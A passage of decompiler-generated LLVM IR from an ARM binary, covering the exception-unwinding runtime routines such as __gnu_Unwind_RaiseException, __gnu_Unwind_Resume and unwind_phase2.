  %v2_1873c = icmp eq i32 %v1_1873c, 0
  %v2_18740 = or i32 %v4_18734, -2147483648
  %tmp81 = bitcast i32 %v4_18734 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18744 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1873c, i32 %v2_18744, i32 %v2_18740
  %v1_18748 = add i32 %v2_18734, -1
  %v2_1874c = add i32 %storemerge39, %v1_18748
  br label %dec_label_pc_18750

dec_label_pc_18750:                               ; preds = %dec_label_pc_18700, %dec_label_pc_18730
  %storemerge40 = phi i32 [ %v2_1874c, %dec_label_pc_18730 ], [ -1, %dec_label_pc_18700 ]
  %v2_18750 = add i32 %storemerge, %v2_18710
  %v0_18754 = load i32, i32* %r4.global-to-local, align 4
  %v3_18754 = icmp ult i32 %v0_18754, %v2_18750
  br i1 %v3_18754, label %dec_label_pc_1875c, label %dec_label_pc_186f4

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18750
  %v9_1875c = icmp eq i32 %v3_18708, %v1_1875c.ph
  br i1 %v9_1875c, label %dec_label_pc_186e4.loopexit, label %dec_label_pc_18764

dec_label_pc_18764:                               ; preds = %dec_label_pc_1875c
  %v1_18764 = add nsw i32 %v3_18708, -1
  br label %dec_label_pc_18700

dec_label_pc_1876c:                               ; preds = %dec_label_pc_186f4
  %v2_1876c = load i32, i32* %v3_18710, align 4
  %v1_18770 = and i32 %v2_1876c, 1073741824
  %v2_18770 = icmp eq i32 %v1_18770, 0
  %v2_18774 = or i32 %v2_1876c, -2147483648
  %tmp83 = bitcast i32 %v2_1876c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18778 = bitcast float %tmp84 to i32
  %v0_1877c = select i1 %v2_18770, i32 %v2_18778, i32 %v2_18774
  %v2_1877c = add i32 %v0_1877c, %v2_18710
  %v1_18780 = load i32, i32* %r6.global-to-local, align 4
  %v2_18780 = add i32 %v1_18780, 72
  %v3_18780 = inttoptr i32 %v2_18780 to i32*
  store i32 %v2_1877c, i32* %v3_18780, align 4
  %v0_18784 = load i32, i32* %r7.global-to-local, align 4
  %v1_18784 = add i32 %v0_18784, 4
  %v2_18784 = inttoptr i32 %v1_18784 to i32*
  %v3_18784 = load i32, i32* %v2_18784, align 4
  %v7_18788 = icmp eq i32 %v3_18784, 1
  br i1 %v7_18788, label %.thread10, label %dec_label_pc_1879c

.thread10:                                        ; preds = %dec_label_pc_1876c
  %v1_18788 = add i32 %v3_18784, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18794 = load i32, i32* %r6.global-to-local, align 4
  %v3_18794 = add i32 %v2_18794, 16
  %v4_18794 = inttoptr i32 %v3_18794 to i32*
  store i32 %v1_18788, i32* %v4_18794, align 4
  br label %dec_label_pc_1869c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_1876c
  %v1_1879c = icmp slt i32 %v3_18784, 0
  br i1 %v1_1879c, label %.thread38, label %dec_label_pc_187b4

.thread38:                                        ; preds = %dec_label_pc_1879c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_187a8 = load i32, i32* %r6.global-to-local, align 4
  %v5_187a8 = add i32 %v4_187a8, 76
  %v6_187a8 = inttoptr i32 %v5_187a8 to i32*
  store i32 %v1_18784, i32* %v6_187a8, align 4
  %v3_187ac = load i32, i32* %r2.global-to-local, align 4
  %v4_187ac = load i32, i32* %r6.global-to-local, align 4
  %v5_187ac = add i32 %v4_187ac, 80
  %v6_187ac = inttoptr i32 %v5_187ac to i32*
  store i32 %v3_187ac, i32* %v6_187ac, align 4
  br label %dec_label_pc_187d4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_1879c
  %v1_187b4 = and i32 %v3_18784, 1073741824
  %v2_187b4 = icmp eq i32 %v1_187b4, 0
  %v2_187b8 = or i32 %v3_18784, -2147483648
  %tmp85 = bitcast i32 %v3_18784 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_187bc = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_187b4, i32 %v2_187bc, i32 %v2_187b8
  %v1_187c0 = add i32 %storemerge42, 4
  %v2_187c4 = add i32 %v1_187c0, %v0_18784
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_187cc = load i32, i32* %r6.global-to-local, align 4
  %v2_187cc = add i32 %v1_187cc, 76
  %v3_187cc = inttoptr i32 %v2_187cc to i32*
  store i32 %v2_187c4, i32* %v3_187cc, align 4
  %v0_187d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_187d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_187d0 = add i32 %v1_187d0, 80
  %v3_187d0 = inttoptr i32 %v2_187d0 to i32*
  store i32 %v0_187d0, i32* %v3_187d0, align 4
  br label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %.thread38, %dec_label_pc_187b4
  %v0_187d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_187d4 = add i32 %v0_187d4, 76
  %v2_187d4 = inttoptr i32 %v1_187d4 to i32*
  %v3_187d4 = load i32, i32* %v2_187d4, align 4
  store i32 %v3_187d4, i32* %r2.global-to-local, align 4
  %v1_187d8 = inttoptr i32 %v3_187d4 to i32*
  %v2_187d8 = load i32, i32* %v1_187d8, align 4
  %v1_187dc = icmp slt i32 %v2_187d8, 0
  br i1 %v1_187dc, label %dec_label_pc_18800, label %dec_label_pc_187e4

dec_label_pc_187e4:                               ; preds = %dec_label_pc_187d4
  %v1_187e4 = and i32 %v2_187d8, 1073741824
  %v2_187e4 = icmp eq i32 %v1_187e4, 0
  %v2_187e8 = or i32 %v2_187d8, -2147483648
  %tmp87 = bitcast i32 %v2_187d8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_187ec = bitcast float %tmp88 to i32
  %v0_187f0 = select i1 %v2_187e4, i32 %v2_187ec, i32 %v2_187e8
  %v2_187f0 = add i32 %v0_187f0, %v3_187d4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_187f8 = add i32 %v0_187d4, 16
  %v3_187f8 = inttoptr i32 %v2_187f8 to i32*
  store i32 %v2_187f0, i32* %v3_187f8, align 4
  br label %dec_label_pc_1869c

dec_label_pc_18800:                               ; preds = %dec_label_pc_187d4
  %v3_18800 = udiv i32 %v2_187d8, 16777216
  %v1_18804 = urem i32 %v3_18800, 16
  %v2_18804 = icmp eq i32 %v1_18804, 0
  br i1 %v2_18804, label %dec_label_pc_1880c, label %dec_label_pc_18820

dec_label_pc_1880c:                               ; preds = %dec_label_pc_18800
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18814 = load i32, i32* %r5.global-to-local, align 4
  %v2_18814 = add i32 %v0_18814, -36892
  %v2_18818 = add i32 %v0_187d4, 16
  %v3_18818 = inttoptr i32 %v2_18818 to i32*
  store i32 %v2_18814, i32* %v3_18818, align 4
  br label %dec_label_pc_1869c

dec_label_pc_18820:                               ; preds = %dec_label_pc_18800
  %v7_18820 = icmp eq i32 %v1_18804, 1
  br i1 %v7_18820, label %dec_label_pc_18844, label %dec_label_pc_18828

dec_label_pc_18828:                               ; preds = %dec_label_pc_18820
  %v7_18828 = icmp eq i32 %v1_18804, 2
  br i1 %v7_18828, label %dec_label_pc_18830, label %dec_label_pc_186e4

dec_label_pc_18830:                               ; preds = %dec_label_pc_18828
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18838 = load i32, i32* %r5.global-to-local, align 4
  %v2_18838 = add i32 %v0_18838, -36908
  %v2_1883c = add i32 %v0_187d4, 16
  %v3_1883c = inttoptr i32 %v2_1883c to i32*
  store i32 %v2_18838, i32* %v3_1883c, align 4
  br label %dec_label_pc_1869c

dec_label_pc_18844:                               ; preds = %dec_label_pc_18820
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1884c = load i32, i32* %r5.global-to-local, align 4
  %v2_1884c = add i32 %v0_1884c, -36900
  %v2_18850 = add i32 %v0_187d4, 16
  %v3_18850 = inttoptr i32 %v2_18850 to i32*
  store i32 %v2_1884c, i32* %v3_18850, align 4
  br label %dec_label_pc_1869c

; uselistorder directives
  uselistorder i32 %v1_18804, { 2, 1, 0 }
  uselistorder i32 %v0_187d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_18784, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18754, { 1, 0 }
  uselistorder i32 %v3_1870c, { 2, 1, 0 }
  uselistorder i32 %v3_18708, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_18700, { 1, 0 }
  uselistorder i32 %v0_18700, { 1, 0 }
  uselistorder i32 %v2_186d4, { 1, 0 }
  uselistorder i32 %v0_18710.pre, { 1, 0 }
  uselistorder i32 %v3_186c0, { 1, 0 }
  uselistorder i32 %v1_18674, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_187d4, { 1, 0 }
  uselistorder label %dec_label_pc_18750, { 1, 0 }
  uselistorder label %dec_label_pc_18700, { 1, 0 }
  uselistorder label %dec_label_pc_186e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1869c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1885c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1885c:
  %v0_1885c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1885c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1885c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1885c, %bb
  %v10_18864 = phi i32 [ %arg1, %dec_label_pc_1885c ], [ 0, %bb ]
  ret i32 %v10_18864

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18878 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1888c = inttoptr i32 %v1_18878 to i32*
  %v2_1888c = load i32, i32* %v1_1888c, align 4
  store i32 %v2_1888c, i32* %r0.global-to-local, align 4
  %v12_1888c = add i32 %entry_vrs, 20
  %v1_18898 = inttoptr i32 %v12_1888c to i32*
  %v2_18898 = load i32, i32* %v1_18898, align 4
  store i32 %v2_18898, i32* %r0.global-to-local, align 4
  %v12_18898 = add i32 %entry_vrs, 36
  %v1_188a0 = inttoptr i32 %v12_18898 to i32*
  %v2_188a0 = load i32, i32* %v1_188a0, align 4
  store i32 %v2_188a0, i32* %r0.global-to-local, align 4
  %v12_188a0 = add i32 %entry_vrs, 52
  store i32 %v12_188a0, i32* @ip, align 4
  %v13_188a4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_188a4, i32* @lr, align 4
  %v1_188a8 = inttoptr i32 %v12_188a0 to i32*
  %v2_188a8 = load i32, i32* %v1_188a8, align 4
  store i32 %v2_188a8, i32* %r0.global-to-local, align 4
  %v9_188a8 = add i32 %entry_vrs, 64
  %v10_188a8 = inttoptr i32 %v9_188a8 to i32*
  %v11_188a8 = load i32, i32* %v10_188a8, align 4
  store i32 0, i32* @r4, align 4
  %v1_188b0 = add i32 %ucbp, 12
  %v2_188b0 = inttoptr i32 %v1_188b0 to i32*
  %v3_188b0 = load i32, i32* %v2_188b0, align 4
  store i32 %v2_188a8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_188c8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_188a8)
  store i32 %v2_188c8, i32* %r0.global-to-local, align 4
  %v0_188cc = load i32, i32* @r6, align 4
  %v1_188cc = load i32, i32* @r4, align 4
  %v9_188cc = icmp eq i32 %v0_188cc, %v1_188cc
  store i32 %v2_188c8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_188cc, label %dec_label_pc_188e0, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_188ec

dec_label_pc_188e0:                               ; preds = %entry
  store i32 %v0_188cc, i32* @r4, align 4
  br label %dec_label_pc_188e8

dec_label_pc_188e8:                               ; preds = %dec_label_pc_189b0, %dec_label_pc_188e0
  br label %dec_label_pc_188ec

dec_label_pc_188ec:                               ; preds = %.thread, %dec_label_pc_188e8
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_188e8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_188ec = icmp eq i32 %v2_188c8, 0
  br i1 %v2_188ec, label %dec_label_pc_18964, label %.thread2.dec_label_pc_18900_crit_edge

.thread2.dec_label_pc_18900_crit_edge:            ; preds = %dec_label_pc_188ec
  br label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %.thread2.dec_label_pc_18900_crit_edge, %dec_label_pc_18964
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_18910 = load i32, i32* @r5, align 4
  store i32 %v0_18910, i32* @r3, align 4
  store i32 100640, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_188b0)
  br i1 false, label %dec_label_pc_18928, label %dec_label_pc_18950

dec_label_pc_18928:                               ; preds = %dec_label_pc_18900
  br i1 undef, label %dec_label_pc_18930, label %dec_label_pc_18954

dec_label_pc_18930:                               ; preds = %dec_label_pc_18928
  br i1 undef, label %dec_label_pc_189b0, label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_18930
  br i1 undef, label %dec_label_pc_189a8, label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %dec_label_pc_18900, %dec_label_pc_18948
  br label %dec_label_pc_18954

dec_label_pc_18954:                               ; preds = %dec_label_pc_18928, %dec_label_pc_18950
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18964:                               ; preds = %dec_label_pc_188ec
  store i32 %v11_188a8, i32* @r3, align 4
  %v2_18968 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18968, i32* @r4, align 4
  %v1_1896c = load i32, i32* @r5, align 4
  %v2_1896c = add i32 %v1_1896c, 20
  %v3_1896c = inttoptr i32 %v2_1896c to i32*
  store i32 %v11_188a8, i32* %v3_1896c, align 4
  store i32 %v2_18968, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1897c = call i32 @memcpy()
  %v0_18984 = load i32, i32* @r6, align 4
  store i32 %v0_18984, i32* %r0.global-to-local, align 4
  %v0_18988 = load i32, i32* @r5, align 4
  %v1_1898c = add i32 %v0_18988, 16
  %v2_1898c = inttoptr i32 %v1_1898c to i32*
  %v3_1898c = load i32, i32* %v2_1898c, align 4
  store i32 %v3_1898c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1898c)
  %v0_1899c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1899c, i32* @r4, align 4
  br label %dec_label_pc_18900

dec_label_pc_189a8:                               ; preds = %dec_label_pc_18948
  br label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %dec_label_pc_18930, %dec_label_pc_189a8
  br label %dec_label_pc_188e8

; uselistorder directives
  uselistorder i32 %v11_188a8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 40, 41, 29, 109, 110, 32, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 30, 31, 33, 34, 35, 36, 37, 38, 39, 91, 65, 66, 67, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 43, 44, 143, 144, 56, 57, 104, 105, 106, 101, 102, 97, 98, 100, 99, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 42, 68, 45, 46, 47, 48, 49, 50, 151, 152, 153, 154, 58, 59, 60, 75, 76, 77, 78, 69, 70, 71, 8, 79, 80, 81, 82, 83, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 103, 54, 55, 61, 62, 63, 64, 72, 7, 73, 74, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96 }
  uselistorder i32 10, { 4, 5, 32, 33, 34, 8, 46, 45, 78, 0, 42, 43, 77, 47, 48, 1, 10, 36, 37, 31, 11, 27, 12, 28, 13, 29, 14, 30, 24, 6, 38, 25, 15, 3, 26, 39, 16, 40, 41, 35, 17, 18, 19, 44, 9, 49, 50, 2, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 20, 62, 63, 64, 21, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 7, 75, 22, 76, 23 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_189b0, { 1, 0 }
  uselistorder label %dec_label_pc_18954, { 1, 0 }
  uselistorder label %dec_label_pc_18950, { 1, 0 }
  uselistorder label %dec_label_pc_18900, { 1, 0 }
  uselistorder label %dec_label_pc_188ec, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_189c4 = add i32 %ucbp, 12
  %v3_189c4 = inttoptr i32 %v2_189c4 to i32*
  store i32 %stop_fn, i32* %v3_189c4, align 4
  %v3_189c8 = add i32 %ucbp, 24
  %v4_189c8 = inttoptr i32 %v3_189c8 to i32*
  store i32 %tmp, i32* %v4_189c8, align 4
  %v1_189cc = add i32 %entry_vrs, 60
  %v2_189cc = inttoptr i32 %v1_189cc to i32*
  %v3_189cc = load i32, i32* %v2_189cc, align 4
  %v2_189d4 = add i32 %entry_vrs, 64
  %v3_189d4 = inttoptr i32 %v2_189d4 to i32*
  store i32 %v3_189cc, i32* %v3_189d4, align 4
  %v3_189dc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_189dc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_189f46 = add i32 %vrs, 64
  %v2_189f47 = inttoptr i32 %v1_189f46 to i32*
  %v3_189f48 = load i32, i32* %v2_189f47, align 4
  %v2_189f89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_189f48)
  store i32 %v2_189f89, i32* %r0.global-to-local, align 4
  %v2_189fc11 = icmp eq i32 %v2_189f89, 0
  br i1 %v2_189fc11, label %dec_label_pc_18a04, label %dec_label_pc_18a34

dec_label_pc_18a04:                               ; preds = %entry, %dec_label_pc_18a04.dec_label_pc_189f0_crit_edge
  %v0_18a04 = load i32, i32* @r5, align 4
  %v1_18a04 = add i32 %v0_18a04, 64
  %v2_18a04 = inttoptr i32 %v1_18a04 to i32*
  %v3_18a04 = load i32, i32* %v2_18a04, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_18a0c = load i32, i32* @r4, align 4
  %v2_18a0c = add i32 %v1_18a0c, 20
  %v3_18a0c = inttoptr i32 %v2_18a0c to i32*
  store i32 %v3_18a04, i32* %v3_18a0c, align 4
  %v0_18a10 = load i32, i32* @r4, align 4
  %v1_18a18 = add i32 %v0_18a10, 16
  %v2_18a18 = inttoptr i32 %v1_18a18 to i32*
  %v3_18a18 = load i32, i32* %v2_18a18, align 4
  call void @__pseudo_branch(i32 %v3_18a18)
  %v0_18a24 = load i32, i32* %r0.global-to-local, align 4
  %v7_18a24 = icmp eq i32 %v0_18a24, 8
  br i1 %v7_18a24, label %dec_label_pc_18a04.dec_label_pc_189f0_crit_edge, label %dec_label_pc_18a2c

dec_label_pc_18a04.dec_label_pc_189f0_crit_edge:  ; preds = %dec_label_pc_18a04
  %v0_189f0.pre = load i32, i32* @r4, align 4
  %v0_189f4.pre = load i32, i32* @r5, align 4
  store i32 %v0_189f0.pre, i32* %r0.global-to-local, align 4
  %v1_189f4 = add i32 %v0_189f4.pre, 64
  %v2_189f4 = inttoptr i32 %v1_189f4 to i32*
  %v3_189f4 = load i32, i32* %v2_189f4, align 4
  %v2_189f8 = call i32 @get_eit_entry(i32 %v0_189f0.pre, i32 %v3_189f4)
  store i32 %v2_189f8, i32* %r0.global-to-local, align 4
  %v2_189fc = icmp eq i32 %v2_189f8, 0
  br i1 %v2_189fc, label %dec_label_pc_18a04, label %dec_label_pc_18a34

dec_label_pc_18a2c:                               ; preds = %dec_label_pc_18a04
  %v7_18a2c = icmp eq i32 %v0_18a24, 7
  br i1 %v7_18a2c, label %dec_label_pc_18a38, label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %entry, %dec_label_pc_18a04.dec_label_pc_189f0_crit_edge, %dec_label_pc_18a2c
  %v0_18a34 = call i32 @abort()
  store i32 %v0_18a34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18a38

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18a2c, %dec_label_pc_18a34
  %v0_18a38 = load i32, i32* @r5, align 4
  %v1_18a38 = add i32 %v0_18a38, 4
  store i32 %v1_18a38, i32* %r0.global-to-local, align 4
  %v1_18a3c = inttoptr i32 %v1_18a38 to i32*
  %v2_18a3c = call i32 @__restore_core_regs(i32* %v1_18a3c)
  store i32 %v2_18a3c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 6, 8, 7, 4, 5, 1, 9, 0 }
  uselistorder label %dec_label_pc_18a38, { 1, 0 }
  uselistorder label %dec_label_pc_18a34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18a04, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_18a40 = add i32 %ucbp, 20
  %v2_18a40 = inttoptr i32 %v1_18a40 to i32*
  %v3_18a40 = load i32, i32* %v2_18a40, align 4
  %v1_18a48 = load i32, i32* %r1.global-to-local, align 4
  %v2_18a48 = add i32 %v1_18a48, 64
  %v3_18a48 = inttoptr i32 %v2_18a48 to i32*
  store i32 %v3_18a40, i32* %v3_18a48, align 4
  %v1_18a4c = add i32 %ucbp, 12
  %v2_18a4c = inttoptr i32 %v1_18a4c to i32*
  %v3_18a4c = load i32, i32* %v2_18a4c, align 4
  %v2_18a50 = icmp eq i32 %v3_18a4c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_18a5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18a5c, i32* @r5, align 4
  br i1 %v2_18a50, label %dec_label_pc_18a64, label %dec_label_pc_18aa0

dec_label_pc_18a64:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18a70 = add i32 %ucbp, 16
  %v2_18a70 = inttoptr i32 %v1_18a70 to i32*
  %v3_18a70 = load i32, i32* %v2_18a70, align 4
  call void @__pseudo_branch(i32 %v3_18a70)
  br i1 false, label %dec_label_pc_18a98, label %dec_label_pc_18a84

dec_label_pc_18a84:                               ; preds = %dec_label_pc_18a64
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13858.560 to i32))
  %v0_18a8c = load i32, i32* @r4, align 4
  %v0_18a90 = load i32, i32* @r5, align 4
  store i32 %v0_18a90, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_18a8c, i32 %v0_18a90)
  br label %dec_label_pc_18a98

dec_label_pc_18a98:                               ; preds = %dec_label_pc_18a64, %dec_label_pc_18a84
  %v0_18a98 = load i32, i32* @r5, align 4
  %v1_18a98 = add i32 %v0_18a98, 4
  %v1_18a9c = inttoptr i32 %v1_18a98 to i32*
  %v2_18a9c = call i32 @__restore_core_regs(i32* %v1_18a9c)
  %v1_18aa4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18aa0

dec_label_pc_18aa0:                               ; preds = %entry, %dec_label_pc_18a98
  %v1_18aa4 = phi i32 [ %v0_18a5c, %entry ], [ %v1_18aa4.pre, %dec_label_pc_18a98 ]
  %v3_18aa4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18aa4, i32 1)
  %v0_18aa8 = call i32 @abort()
  ret i32 %v0_18aa8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 45, 46, 47, 48, 49, 51, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 56, 60, 59, 58, 52, 53, 40, 41, 42, 43, 44, 54, 55, 57, 35, 36, 50, 33, 37, 34, 26, 27, 23, 24, 25, 0, 28, 29, 30, 31, 38, 39, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 96, 139, 4, 140, 141, 142, 143, 5, 82, 115, 144, 6, 81, 145, 7, 80, 146, 147, 148, 149, 8, 150, 116, 9, 84, 151, 10, 83, 152, 153, 11, 154, 155, 156, 12, 157, 158, 13, 159, 14, 118, 160, 161, 117, 162, 163, 15, 85, 16, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 18, 87, 19, 174, 175, 176, 20, 86, 177, 21, 17, 178, 179, 22, 180, 181, 182, 23, 183, 184, 185, 186, 187, 24, 25, 119, 26, 27, 28, 138, 88, 188, 189, 89, 190, 121, 191, 192, 30, 193, 194, 31, 90, 196, 29, 197, 195, 198, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 92, 43, 44, 45, 46, 47, 98, 200, 218, 79, 93, 100, 204, 103, 102, 101, 48, 51, 199, 91, 99, 201, 202, 203, 124, 205, 206, 207, 208, 209, 52, 53, 210, 211, 212, 213, 125, 214, 215, 49, 50, 216, 217, 123, 122, 54, 55, 56, 219, 57, 58, 104, 105, 111, 106, 112, 107, 110, 220, 108, 114, 221, 59, 222, 60, 223, 126, 127, 224, 128, 129, 225, 130, 131, 61, 62, 226, 132, 133, 63, 64, 227, 134, 135, 65, 66, 228, 136, 137, 67, 68, 97, 229, 230, 113, 231, 69, 109, 70, 71, 94, 72, 73, 95, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18aa0, { 1, 0 }
  uselistorder label %dec_label_pc_18a98, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18aac = load i32, i32* @r4, align 4
  store i32 %v3_18aac, i32* %stack_var_-16, align 4
  %v6_18aac = load i32, i32* @r5, align 4
  %v9_18aac = load i32, i32* @r6, align 4
  %v12_18aac = load i32, i32* @lr, align 4
  %v1_18ab0 = add i32 %entry_vrs, 60
  %v2_18ab0 = inttoptr i32 %v1_18ab0 to i32*
  %v3_18ab0 = load i32, i32* %v2_18ab0, align 4
  %v2_18ab4 = add i32 %entry_vrs, 64
  %v3_18ab4 = inttoptr i32 %v2_18ab4 to i32*
  store i32 %v3_18ab0, i32* %v3_18ab4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18ae4 = load i32, i32* %v3_18ab4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_18afc = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18ae4)
  %v2_18b00 = icmp eq i32 %v2_18afc, 0
  br i1 %v2_18b00, label %dec_label_pc_18b08, label %dec_label_pc_18b3c

dec_label_pc_18b08:                               ; preds = %entry
  %v0_18b08 = load i32, i32* @r5, align 4
  %v1_18b10 = add i32 %v0_18b08, 16
  %v2_18b10 = inttoptr i32 %v1_18b10 to i32*
  %v3_18b10 = load i32, i32* %v2_18b10, align 4
  call void @__pseudo_branch(i32 %v3_18b10)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18b28 = load i32, i32* %saved_vrs_-320, align 4
  %v1_18b2c = urem i32 %v2_18b28, 2
  %v2_18b2c = icmp eq i32 %v1_18b2c, 0
  br i1 %v2_18b2c, label %dec_label_pc_18b4c, label %dec_label_pc_18b34

dec_label_pc_18b34:                               ; preds = %dec_label_pc_18b08, %dec_label_pc_18b4c
  %v0_18b34 = phi i1 [ false, %dec_label_pc_18b08 ], [ %phitmp, %dec_label_pc_18b4c ]
  br i1 %v0_18b34, label %dec_label_pc_18b58, label %dec_label_pc_18b3c

dec_label_pc_18b3c:                               ; preds = %entry, %dec_label_pc_18b34
  %v2_18b44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18b44, i32* @r4, align 4
